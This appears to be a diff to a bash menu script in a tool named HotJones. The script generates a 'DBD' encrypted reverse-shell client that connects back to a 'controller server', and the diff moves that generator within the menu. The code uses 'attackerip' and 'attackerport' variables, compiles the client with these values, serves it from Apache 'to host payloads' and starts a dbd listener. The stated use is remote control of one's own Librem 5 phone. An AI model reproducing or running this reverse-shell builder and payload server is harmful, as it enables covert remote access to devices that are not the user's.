@@ -901,68 +901,22 @@ done
 
   "14" | "14" )
 # Accept upper or lowercase input.
-echo -e "\E[1;34m::::: \e[97mSelf Healing Client Generator \E[1;34m:::::"
+echo -e "\E[1;34m::::: \e[97mSelf Healing SSH Client Generator \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97m**WARNING** This Is To Be Run On The Controller Server ONLY (After Installing Server Dependencies) \E[1;34m:::::"
-echo -e "\E[1;34m::::: \e[97mFollow The Prompts To Create The Client Connector \E[1;34m:::::"
-echo -e "\E[1;34m::::: \e[97mThis Client Will Need To Be Placed On Your Librem 5 & Executed \E[1;34m:::::"
-echo -e "\E[1;34m::::: \e[97mThe Client Will Then Connect Back To Your \"Controller\" Server \E[1;34m:::::"
+echo -e "\E[1;34m::::: \e[97mFollow The Prompts To Create The HotJones SSH Client Connector \E[1;34m:::::"
+echo -e "\E[1;34m::::: \e[97m-------------------------------------------------------------- \E[1;34m:::::"
+cat << "EOF"
+The backup DBD client option should only be used by those who understand its uses and limitations. 
+DBD is a (non-tty shell) encrypted ncat clone. It is safe to use; but cannot be use to launch and operate HotJones.
+DBD is included as a limited failsafe option in the event of a "just in case" scenario.
+DBD will need to be placed on your Librem 5 & executed. It will then connect back you your "Controller Server".
+Its connection is self-healing as well.
+EOF
 PS3='Enter your choice: ENTER=Options Menu | 4=Main Menu | 5=QUIT: '
-options=("Librem 5 Client Connector Generator DBD" "Configure Controller Server For SSH Client" "Librem 5 Client Connector Generator SSH" "Main Menu" "Quit")
+options=("Configure Controller Server For SSH Client" "Librem 5 Client Connector Generator SSH" "Librem 5 Client Connector Generator (DBD Backup)" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
-		"Librem 5 Client Connector Generator DBD")	
-			clear
-			read -p "Where is your conroller server? (External IP or Domain Name)" attackerip
-			echo ""
-			read -p "What port will you be listening on? (You Will Need Port Forwarding Setup If Behind a Router/Firewall)" attackerport
-			echo ""
-			read -p "What would you like the shared secret to be on your secure connection? " attackersecret
-			echo ""
-			echo -e "\e[1;34mGenerating your client...\e[0m"
-			echo ""
-			sleep 3
-			sed "/HOST/s/attackerip/$attackerip/g" ~/HotJones/misc/dbd/conf/dbd_unix_reverse.conf > ~/HotJones/misc/dbd/dbd_unix_reverse1.conf
-			sed "/PORT/s/attackerport/$attackerport/g" ~/HotJones/misc/dbd/dbd_unix_reverse1.conf > ~/HotJones/misc/dbd/dbd_unix_reverse2.conf
-			sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/HotJones/misc/dbd/dbd_unix_reverse2.conf > ~/HotJones/misc/dbd/dbd.h
-			rm ~/HotJones/misc/dbd/dbd_unix_reverse1.conf
-			rm ~/HotJones/misc/dbd/dbd_unix_reverse2.conf
-			cd ~/HotJones/misc/dbd/
-			make unix
-			chmod +x dbd
-			cp ~/HotJones/misc/dbd/dbd /var/www/html
-			chown www-data:www-data /var/www/html/dbd
-			echo -e "\E[1;34m\e[97m \e[31mStarting Apache server to host payloads...\e[97m\E[1;34m"
-			SERVICE=Apache;
-	secs=$(date '+%S');
-	if service apache2 status | grep -v grep | grep running > /dev/null
-	then
-		echo "$SERVICE service running"
-	else
-		echo "$SERVICE is not running, Starting service." 
-		service apache2 start
-	fi  
-		#rm dbd
-		#clear
-		cd ~/HotJones
-		echo -e "\E[1;34m\e[97m \e[31mDone! Your payload is located at /var/www/html...\e[97m\E[1;34m"
-		echo ""
-		
-		read -p "Would you like me to launch a listener [y|n]? " listener
-		echo ""
-		
-			if [ "$listener" == "y" ]; then
-				x-terminal-emulator -e dbd -lvp $attackerport -k $attackersecret &
-				read -p "Press any key to contiue" enter
-				clear
-			else
-				echo -e "\e[1;34mWhen you are ready to receive your client connection, enter the following in your terminal:\e[0m"
-				echo "dbd -lvp $attackerport -k $attackersecret"
-				echo ""
-				read -p "Press any key to contiue" enter
-				clear
-			fi
-			;;
 		"Configure Controller Server For SSH Client")
 			echo -e "\e[1;34mRun This Once Before You Run The \"Librem 5 Client Connector Generator SSH\" Option \e[0m"
 			echo -e "\e[1;34mONLY RUN THIS *ONCE* ON YOUR CONTROLLER SERVER!! \e[0m"
@@ -1100,6 +1054,58 @@ EOF
 		echo -e "\E[1;34m\e[97m \e[31msed -i \"/PermitRootLogin/s/yes/prohibit-password/\" /etc/ssh/sshd_config && service ssh restart\e[97m\E[1;34m"
 		echo ""
 		echo "No additional changes for setup are required."
+			;;
+		"Librem 5 Client Connector Generator (DBD Backup)")	
+			clear
+			read -p "Where is your conroller server? (External IP or Domain Name)" attackerip
+			echo ""
+			read -p "What port will you be listening on? (You Will Need Port Forwarding Setup If Behind a Router/Firewall)" attackerport
+			echo ""
+			read -p "What would you like the shared secret to be on your secure connection? " attackersecret
+			echo ""
+			echo -e "\e[1;34mGenerating your client...\e[0m"
+			echo ""
+			sleep 3
+			sed "/HOST/s/attackerip/$attackerip/g" ~/HotJones/misc/dbd/conf/dbd_unix_reverse.conf > ~/HotJones/misc/dbd/dbd_unix_reverse1.conf
+			sed "/PORT/s/attackerport/$attackerport/g" ~/HotJones/misc/dbd/dbd_unix_reverse1.conf > ~/HotJones/misc/dbd/dbd_unix_reverse2.conf
+			sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/HotJones/misc/dbd/dbd_unix_reverse2.conf > ~/HotJones/misc/dbd/dbd.h
+			rm ~/HotJones/misc/dbd/dbd_unix_reverse1.conf
+			rm ~/HotJones/misc/dbd/dbd_unix_reverse2.conf
+			cd ~/HotJones/misc/dbd/
+			make unix
+			chmod +x dbd
+			cp ~/HotJones/misc/dbd/dbd /var/www/html
+			chown www-data:www-data /var/www/html/dbd
+			echo -e "\E[1;34m\e[97m \e[31mStarting Apache server to host payloads...\e[97m\E[1;34m"
+			SERVICE=Apache;
+	secs=$(date '+%S');
+	if service apache2 status | grep -v grep | grep running > /dev/null
+	then
+		echo "$SERVICE service running"
+	else
+		echo "$SERVICE is not running, Starting service." 
+		service apache2 start
+	fi  
+		#rm dbd
+		#clear
+		cd ~/HotJones
+		echo -e "\E[1;34m\e[97m \e[31mDone! Your client is located at /var/www/html...\e[97m\E[1;34m"
+		echo ""
+		
+		read -p "Would you like me to launch a listener [y|n]? " listener
+		echo ""
+		
+			if [ "$listener" == "y" ]; then
+				x-terminal-emulator -e dbd -lvp $attackerport -k $attackersecret &
+				read -p "Press any key to contiue" enter
+				clear
+			else
+				echo -e "\e[1;34mWhen you are ready to receive your client connection, enter the following in your terminal:\e[0m"
+				echo "dbd -lvp $attackerport -k $attackersecret"
+				echo ""
+				read -p "Press any key to contiue" enter
+				clear
+			fi
 			;;
 		"Main Menu")
             ~/HotJones/hijack.sh
